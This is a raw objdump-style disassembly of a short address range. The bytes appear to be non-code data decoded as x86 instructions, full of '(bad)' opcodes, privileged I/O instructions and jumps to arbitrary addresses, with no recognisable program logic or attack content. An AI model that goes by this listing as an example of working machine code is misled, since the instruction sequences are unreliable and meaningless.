1315979d:	e4 00                	in     $0x0,%al
1315979f:	d4 1e                	aam    $0x1e
131597a1:	d7                   	xlat   %ds:(%ebx)
131597a2:	fb                   	sti
131597a3:	11 19                	adc    %ebx,(%ecx)
131597a5:	c0 1b b4             	rcrb   $0xb4,(%ebx)
131597a8:	1f                   	pop    %ds
131597a9:	81 c4 be db 58 c1    	add    $0xc158dbbe,%esp
131597af:	ad                   	lods   %ds:(%esi),%eax
131597b0:	ff 9d c4 fc 60 f8    	lcall  *-0x79f033c(%ebp)
131597b6:	6c                   	insb   (%dx),%es:(%edi)
131597b7:	7f a8                	jg     0x13159761
131597b9:	ff f6                	push   %esi
131597bb:	a8 09                	test   $0x9,%al
131597bd:	19 63 eb             	sbb    %esp,-0x15(%ebx)
131597c0:	5f                   	pop    %edi
131597c1:	8d 6e 01             	lea    0x1(%esi),%ebp
131597c4:	81 fd ff 04 5f 27    	cmp    $0x275f04ff,%ebp
131597ca:	5e                   	pop    %esi
131597cb:	e7 7d                	out    %eax,$0x7d
131597cd:	28 56 69             	sub    %dl,0x69(%esi)
131597d0:	e7 ba                	out    %eax,$0xba
131597d2:	80 5d b0 33          	sbbb   $0x33,-0x50(%ebp)
131597d6:	57                   	push   %edi
131597d7:	1f                   	pop    %ds
131597d8:	26 34 15             	es xor $0x15,%al
131597db:	7c 0f                	jl     0x131597ec
131597dd:	88 52 bc             	mov    %dl,-0x44(%edx)
131597e0:	9f                   	lahf
131597e1:	be c7 8b cb 12       	mov    $0x12cb8bc7,%esi
131597e6:	40                   	inc    %eax
131597e7:	16                   	push   %ss
131597e8:	1a a0 db f3 db 0e    	sbb    0xedbf3db(%eax),%ah
131597ee:	d3 76 9c             	shll   %cl,-0x64(%esi)
131597f1:	c0 07 2d             	rolb   $0x2d,(%edi)
131597f4:	fb                   	sti
131597f5:	2c f6                	sub    $0xf6,%al
131597f7:	32 0d 2f 7d 02 33    	xor    0x33027d2f,%cl
131597fd:	1e                   	push   %ds
131597fe:	53                   	push   %ebx
131597ff:	23 94 c8 7c a0 d3 57 	and    0x57d3a07c(%eax,%ecx,8),%edx
13159806:	54                   	push   %esp
13159807:	5a                   	pop    %edx
13159808:	6c                   	insb   (%dx),%es:(%edi)
13159809:	ea 42 d7 00 f2 ae e0 	ljmp   $0xe0ae,$0xf200d742
13159810:	d1 58 de             	rcrl   $1,-0x22(%eax)
13159813:	b0 93                	mov    $0x93,%al
13159815:	bd a5 4c e9 4f       	mov    $0x4fe94ca5,%ebp
1315981a:	17                   	pop    %ss
1315981b:	66 af                	scas   %es:(%edi),%ax
1315981d:	18 97 86 11 98 70    	sbb    %dl,0x70981186(%edi)
13159823:	3b c9                	cmp    %ecx,%ecx
13159825:	73 05                	jae    0x1315982c
13159827:	fc                   	cld
13159828:	d1 2b                	shrl   $1,(%ebx)
1315982a:	74 47                	je     0x13159873
1315982c:	b2 e9                	mov    $0xe9,%dl
1315982e:	13 73 03             	adc    0x3(%ebx),%esi
13159831:	8b 40 a7             	mov    -0x59(%eax),%eax
13159834:	19 30                	sbb    %esi,(%eax)
13159836:	0b 38                	or     (%eax),%edi
13159838:	a2 3f 4b b3 3a       	mov    %al,0x3ab34b3f
1315983d:	d4 e2                	aam    $0xe2
1315983f:	db 41 55             	fildl  0x55(%ecx)
13159842:	8b 79 e5             	mov    -0x1b(%ecx),%edi
13159845:	56                   	push   %esi
13159846:	fc                   	cld
13159847:	01 fa                	add    %edi,%edx
13159849:	8e 6d bb             	mov    -0x45(%ebp),%gs
1315984c:	10 2b                	adc    %ch,(%ebx)
1315984e:	a3 80 53 8b 4e       	mov    %eax,0x4e8b5380
13159853:	12 13                	adc    (%ebx),%dl
13159855:	11 d0                	adc    %edx,%eax
13159857:	88 bd 08 5a 87 16    	mov    %bh,0x16875a08(%ebp)
1315985d:	79 5b                	jns    0x131598ba
1315985f:	c0 ef bb             	shr    $0xbb,%bh
13159862:	76 eb                	jbe    0x1315984f
13159864:	e8 43 61 41 f8       	call   0xb56f9ac
13159869:	fd                   	std
1315986a:	01 10                	add    %edx,(%eax)
1315986c:	65 43                	gs inc %ebx
1315986e:	fb                   	sti
1315986f:	06                   	push   %es
13159870:	ea 3b 08 74 0e 8e f6 	ljmp   $0xf68e,$0xe74083b
13159877:	25 94 78 0b fe       	and    $0xfe0b7894,%eax
1315987c:	76 71                	jbe    0x131598ef
1315987e:	27                   	daa
1315987f:	4c                   	dec    %esp
13159880:	57                   	push   %edi
13159881:	d3 89 ce ea fc 03    	rorl   %cl,0x3fceace(%ecx)
13159887:	46                   	inc    %esi
13159888:	c6                   	(bad)
13159889:	56                   	push   %esi
1315988a:	86 c1                	xchg   %al,%cl
1315988c:	1c c7                	sbb    $0xc7,%al
1315988e:	aa                   	stos   %al,%es:(%edi)
1315988f:	58                   	pop    %eax
13159890:	4b                   	dec    %ebx
13159891:	1e                   	push   %ds
13159892:	a2 9d 1d 7b 89       	mov    %al,0x897b1d9d
13159897:	fa                   	cli
13159898:	62 03                	bound  %eax,(%ebx)
1315989a:	53                   	push   %ebx
1315989b:	0e                   	push   %cs
1315989c:	58                   	pop    %eax
1315989d:	0f fd c5             	paddw  %mm5,%mm0
131598a0:	2e 95                	cs xchg %eax,%ebp
131598a2:	6c                   	insb   (%dx),%es:(%edi)
131598a3:	03 4f f8             	add    -0x8(%edi),%ecx
131598a6:	45                   	inc    %ebp
131598a7:	70 89                	jo     0x13159832
131598a9:	ca e9 15             	lret   $0x15e9
131598ac:	1c 15                	sbb    $0x15,%al
131598ae:	f9                   	stc
131598af:	50                   	push   %eax
131598b0:	89 ca                	mov    %ecx,%edx
131598b2:	07                   	pop    %es
131598b3:	af                   	scas   %es:(%edi),%eax
131598b4:	ad                   	lods   %ds:(%esi),%eax
131598b5:	1c 5c                	sbb    $0x5c,%al
131598b7:	b8 53 31 ff 37       	mov    $0x37ff3153,%eax
131598bc:	94                   	xchg   %eax,%esp
131598bd:	14 5c                	adc    $0x5c,%al
131598bf:	75 e0                	jne    0x131598a1
131598c1:	2d 1a 8d 08 4a       	sub    $0x4a088d1a,%eax
131598c6:	0d 6a fc 4a eb       	or     $0xeb4afc6a,%eax
131598cb:	0a b7 83 95 fd 15    	or     0x15fd9583(%edi),%dh
131598d1:	09 03                	or     %eax,(%ebx)
131598d3:	0f 39                	(bad)
131598d5:	cf                   	iret
131598d6:	11 5d 40             	adc    %ebx,0x40(%ebp)
131598d9:	eb de                	jmp    0x131598b9
131598db:	26 4a                	es dec %edx
131598dd:	75 ec                	jne    0x131598cb
131598df:	51                   	push   %ecx
131598e0:	17                   	pop    %ss
131598e1:	73 ec                	jae    0x131598cf
131598e3:	77 6c                	ja     0x13159951
131598e5:	b1 ff                	mov    $0xff,%cl
131598e7:	b3 fc                	mov    $0xfc,%bl
131598e9:	be 3c 24 ff 37       	mov    $0x37ff243c,%esi
131598ee:	03 37                	add    (%edi),%esi
131598f0:	4b                   	dec    %ebx
131598f1:	eb 08                	jmp    0x131598fb
131598f3:	91                   	xchg   %eax,%ecx
131598f4:	4e                   	dec    %esi
131598f5:	c6                   	(bad)
131598f6:	b6 a3                	mov    $0xa3,%dh
131598f8:	e1 1b                	loope  0x13159915
131598fa:	0f 9c 18             	setl   (%eax)
131598fd:	89 f2                	mov    %esi,%edx
131598ff:	1b 0a                	sbb    (%edx),%ecx
13159901:	b7 01                	mov    $0x1,%bh
13159903:	ce                   	into
13159904:	8b 5b 41             	mov    0x41(%ebx),%ebx
13159907:	5b                   	pop    %ebx
13159908:	20 3d e9 c5 cb 0c    	and    %bh,0xccbc5e9
1315990e:	fd                   	std
1315990f:	ee                   	out    %al,(%dx)
13159910:	64 73 e6             	fs jae 0x131598f9
13159913:	91                   	xchg   %eax,%ecx
13159914:	4a                   	dec    %edx
13159915:	5a                   	pop    %edx
13159916:	92                   	xchg   %eax,%edx
13159917:	58                   	pop    %eax
13159918:	8d 24 94             	lea    (%esp,%edx,4),%esp
1315991b:	ff e0                	jmp    *%eax
1315991d:	70 f0                	jo     0x1315990f
1315991f:	d6                   	salc
13159920:	19 f7                	sbb    %esi,%edi
13159922:	02 51 b8             	add    -0x48(%ecx),%dl
13159925:	99                   	cltd
13159926:	38 aa ae 70 6b 41    	cmp    %ch,0x416b70ae(%edx)
1315992c:	41                   	inc    %ecx
1315992d:	70 2d                	jo     0x1315995c
1315992f:	7e 48                	jle    0x13159979
13159931:	1f                   	pop    %ds
13159932:	1a 17                	sbb    (%edi),%dl
13159934:	28 71 e3             	sub    %dh,-0x1d(%ecx)
13159937:	23 83 78 b6 75 1d    	and    0x1d75b678(%ebx),%eax
1315993d:	c6                   	(bad)
1315993e:	8a c2                	mov    %dl,%al
13159940:	09 d0                	or     %edx,%eax
13159942:	d1 e8                	shr    $1,%eax
13159944:	6d                   	insl   (%dx),%es:(%edi)
13159945:	63 e0                	arpl   %esp,%eax
13159947:	54                   	push   %esp
13159948:	cb                   	lret
13159949:	d2 89 08 ad 4d bc    	rorb   %cl,-0x43b252f8(%ecx)
1315994f:	3d 70 fc c6 92       	cmp    $0x92c6fc70,%eax
13159954:	eb 28                	jmp    0x1315997e
13159956:	61                   	popa
13159957:	13 12                	adc    (%edx),%edx
13159959:	77 6d                	ja     0x131599c8
1315995b:	2c 31                	sub    $0x31,%al
1315995d:	10 fd                	adc    %bh,%ch
1315995f:	7e 39                	jle    0x1315999a
13159961:	f1                   	int1
13159962:	7c 0a                	jl     0x1315996e
13159964:	da ee                	(bad)
13159966:	01 c6                	add    %eax,%esi
13159968:	f1                   	int1
13159969:	cb                   	lret
1315996a:	33 c9                	xor    %ecx,%ecx
1315996c:	0e                   	push   %cs
1315996d:	29 08                	sub    %ecx,(%eax)
1315996f:	6b b8 60 1a 1a 53 ca 	imul   $0xffffffca,0x531a1a60(%eax),%edi
13159976:	dc db                	(bad)
13159978:	47                   	inc    %edi
13159979:	29 ca                	sub    %ecx,%edx
1315997b:	67 5f                	addr16 pop %edi
1315997d:	fd                   	std
1315997e:	07                   	pop    %es
1315997f:	91                   	xchg   %eax,%ecx
13159980:	cc                   	int3
13159981:	59                   	pop    %ecx
13159982:	89 da                	mov    %ebx,%edx
13159984:	5b                   	pop    %ebx
13159985:	e9 a6 c3 27 30       	jmp    0x433d5d30
1315998a:	17                   	pop    %ss
1315998b:	34 50                	xor    $0x50,%al
1315998d:	8c c3                	mov    %es,%ebx
1315998f:	fb                   	sti
13159990:	30 f9                	xor    %bh,%cl
13159992:	27                   	daa
13159993:	27                   	daa
13159994:	18 f2                	sbb    %dh,%dl
13159996:	2b 4a 90             	sub    -0x70(%edx),%ecx
13159999:	39 49 e5             	cmp    %ecx,-0x1b(%ecx)
1315999c:	5e                   	pop    %esi
1315999d:	6d                   	insl   (%dx),%es:(%edi)
1315999e:	d0 2b                	shrb   $1,(%ebx)
131599a0:	24 ee                	and    $0xee,%al
131599a2:	d0 d4                	rcl    $1,%ah
131599a4:	3f                   	aas
131599a5:	ad                   	lods   %ds:(%esi),%eax
131599a6:	c5 a7 70 85 c0 27    	lds    0x27c08570(%edi),%esp
131599ac:	30 d0                	xor    %dl,%al
131599ae:	09 1b                	or     %ebx,(%ebx)
131599b0:	ac                   	lods   %ds:(%esi),%al
131599b1:	de 60 44             	fisubs 0x44(%eax)
131599b4:	08 37                	or     %dh,(%edi)
131599b6:	53                   	push   %ebx
131599b7:	97                   	xchg   %eax,%edi
131599b8:	3c 20                	cmp    $0x20,%al
131599ba:	58                   	pop    %eax
131599bb:	c5 9c 24 92 52 59 31 	lds    0x31595292(%esp),%ebx
131599c2:	56                   	push   %esi
131599c3:	14 10                	adc    $0x10,%al
131599c5:	d9 90 66 7c 71 02    	fsts   0x2717c66(%eax)
131599cb:	df c3                	ffreep %st(3)
131599cd:	c6                   	(bad)
131599ce:	50                   	push   %eax
131599cf:	6e                   	outsb  %ds:(%esi),(%dx)
131599d0:	dc 11                	fcoml  (%ecx)
131599d2:	e4 f7                	in     $0xf7,%al
131599d4:	1d 69 02 73 ff       	sbb    $0xff730269,%eax
131599d9:	06                   	push   %es
131599da:	52                   	push   %edx
131599db:	17                   	pop    %ss
131599dc:	ec                   	in     (%dx),%al
131599dd:	0f d4 ec             	paddq  %mm4,%mm5
131599e0:	64 ac                	lods   %fs:(%esi),%al
131599e2:	8b 0e                	mov    (%esi),%ecx
131599e4:	50                   	push   %eax
131599e5:	16                   	push   %ss
131599e6:	59                   	pop    %ecx
131599e7:	0f c1 8a e7 7f 0e 0c 	xadd   %ecx,0xc0e7fe7(%edx)
131599ee:	7f 31                	jg     0x13159a21
131599f0:	60                   	pusha
131599f1:	ac                   	lods   %ds:(%esi),%al
131599f2:	d8 50 1c             	fcoms  0x1c(%eax)
131599f5:	71 e8                	jno    0x131599df
131599f7:	d3 6c 31 dc          	shrl   %cl,-0x24(%ecx,%esi,1)
131599fb:	17                   	pop    %ss
131599fc:	75 bc                	jne    0x131599ba
131599fe:	57                   	push   %edi
131599ff:	d9 0a                	(bad) (%edx)
13159a01:	b1 74                	mov    $0x74,%cl
13159a03:	9e                   	sahf
13159a04:	af                   	scas   %es:(%edi),%eax
13159a05:	d1 51 14             	rcll   $1,0x14(%ecx)
13159a08:	72 e4                	jb     0x131599ee
13159a0a:	71 b9                	jno    0x131599c5
13159a0c:	40                   	inc    %eax
13159a0d:	7e 91                	jle    0x131599a0
13159a0f:	bb 29 cc eb 5d       	mov    $0x5debcc29,%ebx
13159a14:	07                   	pop    %es
13159a15:	ca 0f e4             	lret   $0xe40f
13159a18:	39 54 7e 2a          	cmp    %edx,0x2a(%esi,%edi,2)
13159a1c:	b8 eb 2a 24 13       	mov    $0x13242aeb,%eax
13159a21:	72 90                	jb     0x131599b3
13159a23:	b9 2d ec 54 b3       	mov    $0xb354ec2d,%ecx
13159a28:	7d 2c                	jge    0x13159a56
13159a2a:	39 2d ec 27 c9 94    	cmp    %ebp,0x94c927ec
13159a30:	0c c5                	or     $0xc5,%al
13159a32:	72 12                	jb     0x13159a46
13159a34:	5a                   	pop    %edx
13159a35:	50                   	push   %eax
13159a36:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159a37:	17                   	pop    %ss
13159a38:	cc                   	int3
13159a39:	fe                   	(bad)
13159a3a:	5a                   	pop    %edx
13159a3b:	2f                   	das
13159a3c:	9c                   	pushf
13159a3d:	d0 a2 35 c9 11 90    	shlb   $1,-0x6fee36cb(%edx)
13159a43:	ce                   	into
13159a44:	8a 0a                	mov    (%edx),%cl
13159a46:	42                   	inc    %edx
13159a47:	79 81                	jns    0x131599ca
13159a49:	d4 ba                	aam    $0xba
13159a4b:	e9 66 2c 0b d3       	jmp    0xe620c6b6
13159a50:	2a b8 65 08 66 26    	sub    0x26660865(%eax),%bh
13159a56:	03 2b                	add    (%ebx),%ebp
13159a58:	27                   	daa
13159a59:	06                   	push   %es
13159a5a:	01 ee                	add    %ebp,%esi
13159a5c:	a8 04                	test   $0x4,%al
13159a5e:	c6 b8                	xabort $0xb8,(bad)
13159a60:	1e                   	push   %ds
13159a61:	3b 8b 05 e3 21 10    	cmp    0x1021e305(%ebx),%ecx
13159a67:	9b df d1             	(bad)
13159a6a:	e8 eb ea 89 f9       	call   0xc9f855a
13159a6f:	ba 5d 31 a1 c5       	mov    $0xc5a1315d,%edx
13159a74:	ed                   	in     (%dx),%eax
13159a75:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
13159a76:	42                   	inc    %edx
13159a77:	8b 0f                	mov    (%edi),%ecx
13159a79:	00 87 87 16 4f f0    	add    %al,-0xfb0e979(%edi)
13159a7f:	8d                   	lea    (bad),%eax
13159a80:	c2 0e a4             	ret    $0xa40e
13159a83:	1b cc                	sbb    %esp,%ecx
13159a85:	1a 5b c4             	sbb    -0x3c(%ebx),%bl
13159a88:	7e 10                	jle    0x13159a9a
13159a8a:	c4                   	(bad)
13159a8b:	c9                   	leave
13159a8c:	11 1f                	adc    %ebx,(%edi)
13159a8e:	f7 de                	neg    %esi
13159a90:	db 47 0c             	fildl  0xc(%edi)
13159a93:	cb                   	lret
13159a94:	0f 8d 14 77 3d 0d    	jge    0x205311ae
13159a9a:	17                   	pop    %ss
13159a9b:	19 90 88 5f d7 2d    	sbb    %edx,0x2dd75f88(%eax)
13159aa1:	bc 5a 97 f8 82       	mov    $0x82f8975a,%esp
13159aa6:	3d 5a 98 65 4b       	cmp    $0x4b65985a,%eax
13159aab:	60                   	pusha
13159aac:	b2 35                	mov    $0x35,%dl
13159aae:	e0 00                	loopne 0x13159ab0
13159ab0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
13159ab1:	9f                   	lahf
13159ab2:	31 68 1e             	xor    %ebp,0x1e(%eax)
13159ab5:	ba 59 c1 0b 54       	mov    $0x540bc159,%edx
13159aba:	93                   	xchg   %eax,%ebx
13159abb:	61                   	popa
13159abc:	ce                   	into
13159abd:	24 0a                	and    $0xa,%al
13159abf:	d9 7b 5f             	fnstcw 0x5f(%ebx)
13159ac2:	30 63 f5             	xor    %ah,-0xb(%ebx)
13159ac5:	34 4f                	xor    $0x4f,%al
13159ac7:	91                   	xchg   %eax,%ecx
13159ac8:	da 63 ee             	fisubl -0x12(%ebx)
13159acb:	d8 10                	fcoms  (%eax)
13159acd:	03 93 62 6d c9 d2    	add    -0x2d36929e(%ebx),%edx
13159ad3:	f2 de 4c b9 49       	repnz fimuls 0x49(%ecx,%edi,4)
13159ad8:	9a 25 90 14 a8 ad 5c 	lcall  $0x5cad,$0xa8149025
13159adf:	dd c7                	ffree  %st(7)
13159ae1:	a0 53 54 39 d0       	mov    0xd0395453,%al
13159ae6:	74 72                	je     0x13159b5a
13159ae8:	8e 51 13             	mov    0x13(%ecx),%ss
13159aeb:	fe                   	(bad)
13159aec:	97                   	xchg   %eax,%edi
13159aed:	6e                   	outsb  %ds:(%esi),(%dx)
13159aee:	15 b4 91 8b 57       	adc    $0x578b91b4,%eax
13159af3:	3e d0 77 02          	shlb   $1,%ds:0x2(%edi)
13159af7:	01 c2                	add    %eax,%edx
13159af9:	52                   	push   %edx
13159afa:	c1 ea 02             	shr    $0x2,%edx
13159afd:	d6                   	salc
13159afe:	7f a3                	jg     0x13159aa3
13159b00:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159b01:	6d                   	insl   (%dx),%es:(%edi)
13159b02:	8b de                	mov    %esi,%ebx
13159b04:	1f                   	pop    %ds
13159b05:	39 d9                	cmp    %ebx,%ecx
13159b07:	75 41                	jne    0x13159b4a
13159b09:	4a                   	dec    %edx
13159b0a:	74 15                	je     0x13159b21
13159b0c:	94                   	xchg   %eax,%esp
13159b0d:	bb a1 ce d5 04       	mov    $0x4d5cea1,%ebx
13159b12:	ea 0c 34 48 83 c7 08 	ljmp   $0x8c7,$0x8348340c
13159b19:	74 a1                	je     0x13159abc
13159b1b:	cb                   	lret
13159b1c:	56                   	push   %esi
13159b1d:	6a e2                	push   $0xffffffe2
13159b1f:	63 0a                	arpl   %ecx,(%edx)
13159b21:	04 04                	add    $0x4,%al
13159b23:	5a                   	pop    %edx
13159b24:	11 b4 bb b5 5b 2b 0b 	adc    %esi,0xb2b5bb5(%ebx,%edi,4)
13159b2b:	66 2c 02             	data16 sub $0x2,%al
13159b2e:	1f                   	pop    %ds
13159b2f:	66 21 21             	and    %sp,(%ecx)
13159b32:	01 3b                	add    %edi,(%ebx)
13159b34:	57                   	push   %edi
13159b35:	2a b6 08 1d 49 95    	sub    -0x6ab6e2f8(%esi),%dh
13159b3b:	53                   	push   %ebx
13159b3c:	06                   	push   %es
13159b3d:	0f 5a 56 3d          	cvtps2pd 0x3d(%esi),%xmm2
13159b41:	f7 7f 17             	idivl  0x17(%edi)
13159b44:	09 c1                	or     %eax,%ecx
13159b46:	e9 10 c1 eb 10       	jmp    0x24015c5b
13159b4b:	0a c8                	or     %al,%cl
13159b4d:	3f                   	aas
13159b4e:	90                   	nop
13159b4f:	4a                   	dec    %edx
13159b50:	35 29 8d 7c 7f       	xor    $0x7f7c8d29,%eax
13159b55:	d0 78 53             	sarb   $1,0x53(%eax)
13159b58:	7c 83                	jl     0x13159add
13159b5a:	fb                   	sti
13159b5b:	01 7d 32             	add    %edi,0x32(%ebp)
13159b5e:	07                   	pop    %es
13159b5f:	4b                   	dec    %ebx
13159b60:	3b c3                	cmp    %ebx,%eax
13159b62:	40                   	inc    %eax
13159b63:	1d ee 37 d7 9f       	sbb    $0x9fd737ee,%eax
13159b68:	ff 0e                	decl   (%esi)
13159b6a:	4e                   	dec    %esi
13159b6b:	08 2b                	or     %ch,(%ebx)
13159b6d:	c3                   	ret
13159b6e:	3b f8                	cmp    %eax,%edi
13159b70:	0f 4e 03             	cmovle (%ebx),%eax
13159b73:	81 8b f1 d2 d2 03 0e 	orl    $0x91084d0e,0x3d2d2f1(%ebx)
13159b7a:	4d 08 91 
13159b7d:	82 48 2c bc          	orb    $0xbc,0x2c(%eax)
13159b81:	09 ee                	or     %ebp,%esi
13159b83:	99                   	cltd
13159b84:	4b                   	dec    %ebx
13159b85:	db 4a 33             	fisttpl 0x33(%edx)
13159b88:	45                   	inc    %ebp
13159b89:	46                   	inc    %esi
13159b8a:	bb 86 21 cd c3       	mov    $0xc3cd2186,%ebx
13159b8f:	6e                   	outsb  %ds:(%esi),(%dx)
13159b90:	51                   	push   %ecx
13159b91:	7c 69                	jl     0x13159bfc
13159b93:	75 1a                	jne    0x13159baf
13159b95:	6e                   	outsb  %ds:(%esi),(%dx)
13159b96:	ed                   	in     (%dx),%eax
13159b97:	ed                   	in     (%dx),%eax
13159b98:	7c 65                	jl     0x13159bff
13159b9a:	4a                   	dec    %edx
13159b9b:	7e 61                	jle    0x13159bfe
13159b9d:	4b                   	dec    %ebx
13159b9e:	66 49                	dec    %cx
13159ba0:	2b c7                	sub    %edi,%eax
13159ba2:	dd ff                	(bad)
13159ba4:	00 9a 8b 3a 9e ff    	add    %bl,-0x61c575(%edx)
13159baa:	6f                   	outsl  %ds:(%esi),(%dx)
13159bab:	09 17                	or     %edx,(%edi)
13159bad:	59                   	pop    %ecx
13159bae:	d8 e0                	fsub   %st(0),%st
13159bb0:	ec                   	in     (%dx),%al
13159bb1:	ad                   	lods   %ds:(%esi),%eax
13159bb2:	eb 39                	jmp    0x13159bed
13159bb4:	93                   	xchg   %eax,%ebx
13159bb5:	1f                   	pop    %ds
13159bb6:	0c 84                	or     $0x84,%al
13159bb8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
13159bb9:	08 0f                	or     %cl,(%edi)
13159bbb:	ec                   	in     (%dx),%al
13159bbc:	98                   	cwtl
13159bbd:	26 45                	es inc %ebp
13159bbf:	fc                   	cld
13159bc0:	c4                   	(bad)
13159bc1:	de dc                	(bad)
13159bc3:	dd 3f                	fnstsw (%edi)
13159bc5:	17                   	pop    %ss
13159bc6:	2b f7                	sub    %edi,%esi
13159bc8:	0d 26 70 8b cf       	or     $0xcf8b7026,%eax
13159bcd:	1a c0                	sbb    %al,%al
13159bcf:	70 27                	jo     0x13159bf8
13159bd1:	2c a9                	sub    $0xa9,%al
13159bd3:	5a                   	pop    %edx
13159bd4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159bd5:	c5 0c 09             	lds    (%ecx,%ecx,1),%ecx
13159bd8:	20 74 9c 41          	and    %dh,0x41(%esp,%ebx,4)
13159bdc:	57                   	push   %edi
13159bdd:	4b                   	dec    %ebx
13159bde:	99                   	cltd
13159bdf:	3a 67 85             	cmp    -0x7b(%edi),%ah
13159be2:	6f                   	outsl  %ds:(%esi),(%dx)
13159be3:	9b                   	fwait
13159be4:	e9 8b 4f 9a ea       	jmp    0xfdafeb74
13159be9:	56                   	push   %esi
13159bea:	05 ea 4a 78 20       	add    $0x20784aea,%eax
13159bef:	28 de                	sub    %bl,%dh
13159bf1:	fd                   	std
13159bf2:	f1                   	int1
13159bf3:	0d 3a 02 29 d1       	or     $0xd129023a,%eax
13159bf8:	7e 16                	jle    0x13159c10
13159bfa:	d3 11                	rcll   %cl,(%ecx)
13159bfc:	89 cb                	mov    %ecx,%ebx
13159bfe:	24 d1                	and    $0xd1,%al
13159c00:	f3 66 a7             	repz cmpsw %es:(%edi),%ds:(%esi)
13159c03:	6c                   	insb   (%dx),%es:(%edi)
13159c04:	6f                   	outsl  %ds:(%esi),(%dx)
13159c05:	b5 d4                	mov    $0xd4,%ch
13159c07:	3b e4                	cmp    %esp,%esp
13159c09:	89 bb ea 5a 31 f2    	mov    %edi,-0xdcea516(%ebx)
13159c0f:	0a 0a                	or     (%edx),%cl
13159c11:	85 25 4c dd ec f8    	test   %esp,0xf8ecdd4c
13159c17:	3d db 5d 61 42       	cmp    $0x42615ddb,%eax
13159c1c:	f0 52                	lock push %edx
13159c1e:	db 1a                	fistpl (%edx)
13159c20:	d3 27                	shll   %cl,(%edi)
13159c22:	22 d6                	and    %dh,%dl
13159c24:	e1 0e                	loope  0x13159c34
13159c26:	2c a7                	sub    $0xa7,%al
13159c28:	58                   	pop    %eax
13159c29:	07                   	pop    %es
13159c2a:	e9 5e 77 84 ea       	jmp    0xfd9a138d
13159c2f:	30 13                	xor    %dl,(%ebx)
13159c31:	9a 8b c8 98 d3 16 bd 	lcall  $0xbd16,$0xd398c88b
13159c38:	66 ef                	out    %ax,(%dx)
13159c3a:	f4                   	hlt
13159c3b:	96                   	xchg   %eax,%esi
13159c3c:	7d 95                	jge    0x13159bd3
13159c3e:	93                   	xchg   %eax,%ebx
13159c3f:	63 0d 52 2c 43 27    	arpl   %ecx,0x27432c52
13159c45:	26 7a 5a             	es jp  0x13159ca2
13159c48:	f7 a7 ae 3e 7b 50    	mull   0x507b3eae(%edi)
13159c4e:	fb                   	sti
13159c4f:	b1 02                	mov    $0x2,%cl
13159c51:	73 53                	jae    0x13159ca6
13159c53:	8a 4a 01             	mov    0x1(%edx),%cl
13159c56:	8b 4a dd             	mov    -0x23(%edx),%ecx
13159c59:	d8 22                	fsubs  (%edx)
13159c5b:	52                   	push   %edx
13159c5c:	11 3f                	adc    %edi,(%edi)
13159c5e:	7c 11                	jl     0x13159c71
13159c60:	05 10 e2 52 18       	add    $0x1852e210,%eax
13159c65:	c0 4d 8b 12          	rorb   $0x12,-0x75(%ebp)
13159c69:	f4                   	hlt
13159c6a:	c1 0a dc             	rorl   $0xdc,(%edx)
13159c6d:	70 2e                	jo     0x13159c9d
13159c6f:	9c                   	pushf
13159c70:	fe 4f 7f             	decb   0x7f(%edi)
13159c73:	e7 89                	out    %eax,$0x89
13159c75:	53                   	push   %ebx
13159c76:	68 c1 c8 46 04       	push   $0x446c8c1
13159c7b:	10 07                	adc    %al,(%edi)
13159c7d:	03 6a 15             	add    0x15(%edx),%ebp
13159c80:	eb 2e                	jmp    0x13159cb0
13159c82:	fd                   	std
13159c83:	b0 10                	mov    $0x10,%al
13159c85:	e8 f7 8d 4a 16       	call   0x29602a81
13159c8a:	af                   	scas   %es:(%edi),%eax
13159c8b:	0d c8 e0 ae a1       	or     $0xa1aee0c8,%eax
13159c90:	dc f8                	fdivr  %st,%st(0)
13159c92:	ff b7 ba 8a 06 8a    	push   -0x75f97546(%edi)
13159c98:	56                   	push   %esi
13159c99:	01 3c 0a             	add    %edi,(%edx,%ecx,1)
13159c9c:	74 25                	je     0x13159cc3
13159c9e:	3c 0b                	cmp    $0xb,%al
13159ca0:	74 3e                	je     0x13159ce0
13159ca2:	3c 0c                	cmp    $0xc,%al
13159ca4:	76 3c                	jbe    0x13159ce2
13159ca6:	0d db 66 fb 4b       	or     $0x4bfb66db,%eax
13159cab:	25 3c 0e 74 76       	and    $0x76740e3c,%eax
13159cb0:	3c 0f                	cmp    $0xf,%al
13159cb2:	2c 84                	sub    $0x84,%al
13159cb4:	3c 11                	cmp    $0x11,%al
13159cb6:	07                   	pop    %es
13159cb7:	8b dc                	mov    %esp,%ebx
13159cb9:	b6 23                	mov    $0x23,%dh
13159cbb:	00 93 2f 76 42 01    	add    %dl,0x142762f(%ebx)
13159cc1:	66 7f 0a             	data16 jg 0x13159cce
13159cc4:	7d 05                	jge    0x13159ccb
13159cc6:	be 08 5f 10 81       	mov    $0x81105f08,%esi
13159ccb:	e4 0b                	in     $0xb,%al
13159ccd:	64 8f                	fs (bad)
13159ccf:	9d                   	popf
13159cd0:	75 f2                	jne    0x13159cc4
13159cd2:	1c 81                	sbb    $0x81,%al
13159cd4:	07                   	pop    %es
13159cd5:	bb 77 19 29 e4       	mov    $0xe4291977,%ebx
13159cda:	eb b1                	jmp    0x13159c8d
13159cdc:	fd                   	std
13159cdd:	0a b4 6e 13 18 81 2e 	or     0x2e811813(%esi,%ebp,2),%dh
13159ce4:	84 a4 f3 bb f0 f6 6f 	test   %ah,0x6ff6f0bb(%ebx,%esi,8)
13159ceb:	8f                   	(bad)
13159cec:	55                   	push   %ebp
13159ced:	89 d5                	mov    %edx,%ebp
13159cef:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
13159cf3:	15 03 5c 2e 1d       	adc    $0x1d2e5c03,%eax
13159cf8:	4c                   	dec    %esp
13159cf9:	2e d0 cd             	cs ror $1,%ch
13159cfc:	dc 97 6f 12 1c 9c    	fcoml  -0x63e3ed91(%edi)
13159d02:	e8 5d eb 41 1d       	call   0x30578864
13159d07:	19 f9                	sbb    %edi,%ecx
13159d09:	96                   	xchg   %eax,%esi
13159d0a:	e5 2b                	in     $0x2b,%eax
13159d0c:	30 15 50 f0 2b 42    	xor    %dl,0x422bf050
13159d12:	04 3c                	add    $0x3c,%al
13159d14:	6b 6d a4 36          	imul   $0x36,-0x5c(%ebp),%ebp
13159d18:	1c 0e                	sbb    $0xe,%al
13159d1a:	1d 10 35 44 37       	sbb    $0x37443510,%eax
